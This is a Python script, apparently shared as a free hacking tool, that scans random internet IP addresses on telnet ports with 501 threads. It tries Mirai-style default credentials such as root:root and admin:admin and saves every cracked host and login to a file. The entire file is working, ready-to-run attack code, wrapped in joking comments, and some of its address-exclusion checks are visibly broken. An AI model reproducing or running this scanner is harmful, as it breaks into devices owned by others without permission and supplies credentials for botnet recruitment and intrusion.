#Lag free coded by Ala ;) - @YourAnonS0u1 (S0u1) ; Whats new?
# This one only displays the cracked telnet servers *Randomly* but "safe"...
# Enjoy cause its free :v 
import xtelnet,socket
from threading import Thread
from time import sleep #Cause u gon need it btw..
from random #shit and 
import randint #shit... ok lets begin
timeout=10 # U know bro?
threads=501 # Cause I am living like larry.. most people have it at 500 >_< but u know.. I'm Brazy.. *STAY DANGEROUS *
stop=False
telnet_results='telnet.txt'
def create_file(w):
    with open(w ,"a+") as f:
     pass
create_file(telnet_results) # <--- vIrUs PaYlOaD <o< h4xx0r AlErT!!!!!!!! x)
def getip(): #We are going to now find random shit.. like dog shit type shit..
 '''
   this function was inspired by the scanning file in mirai's source code to returns a safe IP to bruteforce.
'''
 d=[3,6,7,10,11,15,16,21,22,23,26,28,29,30,33,55,56,127,214,215]
 f=[100,169,172,198]
 while True:
  o1=randint(1,253) #Random shit u kno
  o2=randint(0,254) #More Random Shit
  if (o1 not in d):
   if o1 in f:
    if ((o1==192)and(o2!=168)):
     return '{}.{}.{}.{}'.format(o1,o2,randint(0,255),randint(0,255))
    if ((o2==172)and((o2<=16)and(o2>=32))):
     return '{}.{}.{}.{}'.format(o1,o2,randint(0,255),randint(0,255))
    if((o1==100)and(o2!=64)):
     return '{}.{}.{}.{}'.format(o1,o2,randint(0,255),randint(0,255))
    if((o1==169)and (o2!=254)):
     return '{}.{}.{}.{}'.format(o1,o2,randint(0,255),randint(0,255))
    if((o1==198)and(o2!=18)):
     return '{}.{}.{}.{}'.format(o1,o2,randint(0,255),randint(0,255))
   else:
    return '{}.{}.{}.{}'.format(o1,o2,randint(0,255),randint(0,255))
def write_file(w): #Haxxor Alert
    with open('telnet.txt',"a+") as f: #S0u1
        f.write(w+'\n') #S0u1
        return   

class iott(Thread): #@YourAnonS0u1
 def run(self): #Definatly run 
  while (stop!=True): 
   ip=getip()
   for port in [23,2323,9000,9001]: #wOw bro 
    i=False # this is not good guys I failed us D:
    if stop==True:
        break
    try:
     so=socket.socket() # So socket says this and socket says that but the fucked up thing is socket never goes back
     so.settimeout(timeout)
     so.connect((ip,port))
     so.close()
     i=True #YoU kNoW I iZ aLwAyS tRuE?
    except: 
     pass
    if i==True: #Better Use a VPS LOL My Mirai bruteforce user:pass
     for x in ['root:','root:root','admin:admin','root:pass']: #Increase tis if ya want but you have to add 'usr:psw' but short cause its quicker :v 
      try:
       #print('\033[92m[*]Trying: {}:{} {}:{}'.format(ip,port,x.split(':')[0],x.split(':')[1]))
       t=xtelnet.session() #Class is in session
       t.connect(ip,p=port,username=x.split(':')[0],password=x.split(':')[1],timeout=timeout) #When would my life end
       print(ip+":"+str(port)+":"+x.split(':')[0]+":"+x.split(':')[1])
       write_file(ip+":"+str(port)+":"+x.split(':')[0]+":"+x.split(':')[1])
       t.close() #I hear heart beats but I swear to god.. it still...
       break
      except Exception as e:
       #Tooken off cause of lag :print("\033[91m[-]Failed: "+ip+":"+str(port)+":"+x.split(':')[0]+":"+x.split(':')[1]+" ==>"+str(e))
       if " Authentication Failed" not in str(e): #ABORT ABORT IT WAS A LOSS GUYS!!
           break #You've failed us... we will get them next time...
def scan(): #Scanning for goals cause my life goals failed so i got off my ass
 global stop #HAMMER TIME!
 stop=False #I watched this stop=False argument for ever and it made me think of my dad.. RIP dad x'D
 thr=[]
 for x in range(threads):
  try:
   t=iott().start()
   thr.append(t)
  except:
   pass
 while (stop!=True):
  try:
    sleep(.1) #This is actually on point with my rest at times
  except KeyboardInterrupt:
    stop=True
    break
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
scan()
